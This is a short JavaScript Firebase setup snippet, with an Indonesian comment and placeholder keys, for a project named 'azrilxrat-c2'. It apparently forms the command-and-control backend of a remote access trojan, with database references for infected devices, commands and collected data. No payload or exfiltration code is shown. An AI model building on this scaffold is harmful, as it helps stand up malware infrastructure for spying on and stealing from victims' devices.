// ⚠️ GANTI DENGAN CONFIG FIREBASE LO!
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  authDomain: "azrilxrat-c2.firebaseapp.com",
  databaseURL: "https://azrilxrat-c2-default-rtdb.firebaseio.com",
  projectId: "azrilxrat-c2",
  storageBucket: "azrilxrat-c2.appspot.com",
  messagingSenderId: "123456789",
  appId: "1:123456789:web:abcdef123456"
};

// Initialize Firebase
firebase.initializeApp(FIREBASE_CONFIG);
const db = firebase.database();

// References
const devicesRef = db.ref('devices');
const commandsRef = db.ref('commands');
const dataRef = db.ref('collected_data');